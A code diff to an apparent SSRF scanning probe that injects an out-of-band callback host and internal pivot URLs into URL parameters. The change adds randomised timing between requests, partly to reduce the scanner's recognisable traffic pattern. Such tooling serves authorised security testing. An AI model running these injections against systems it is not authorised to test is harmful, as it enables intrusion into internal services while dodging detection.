@@ -1974,12 +1974,34 @@ class SSRFOOBProbe(DeepScanProbe):
                 )]
             return []
 
+        # Inter-request jitter: random uniform delay between probe requests
+        # within a single base. Two reasons:
+        #   1. Uniform 333ms-interval traffic is a recognizable scanner
+        #      pattern on its own; small randomization reduces the burst
+        #      fingerprint without changing the per-second average.
+        #   2. Some rate limiters use sliding-window detection that's more
+        #      forgiving of varied timing than perfectly-spaced bursts.
+        # Per-request jitter is bounded ABOVE by what would push us past
+        # the per-program rate cap; if rate_limit_rps is configured we cap
+        # the upper bound at 1/rate_limit_rps to stay in budget. NOT a
+        # rate-limit-bypass technique — average pacing stays within cap.
+        import random as _random
+        if self.rate_limit_rps:
+            jitter_max = 1.0 / self.rate_limit_rps
+            jitter_min = jitter_max * 0.4
+        else:
+            jitter_min, jitter_max = 0.0, 0.1
+
+        async def jittered_get(url: str):
+            await asyncio.sleep(_random.uniform(jitter_min, jitter_max))
+            return await self._get(url)
+
         async def probe_base_active(base: str):
             # Modes 2 & 3: inject OOB host into each candidate param.
             results = []
             for param in self.SSRF_PARAMS:
                 url = f"{base.rstrip('/')}?{urlencode({param: f'http://{self.oob_host}/{param}-{hash(base) & 0xffff:x}'})}"
-                r = await self._get(url)
+                r = await jittered_get(url)
                 if r is None:
                     continue
                 # OOB-active: emit HIGH finding; operator confirms via OOB listener
@@ -2001,7 +2023,7 @@ class SSRFOOBProbe(DeepScanProbe):
                 if self.mode == "internal-pivot":
                     for pivot in self.pivot_urls:
                         purl = f"{base.rstrip('/')}?{urlencode({param: pivot})}"
-                        pr = await self._get(purl)
+                        pr = await jittered_get(purl)
                         if pr is None:
                             continue
                         body = (pr.text or "")[:4096]
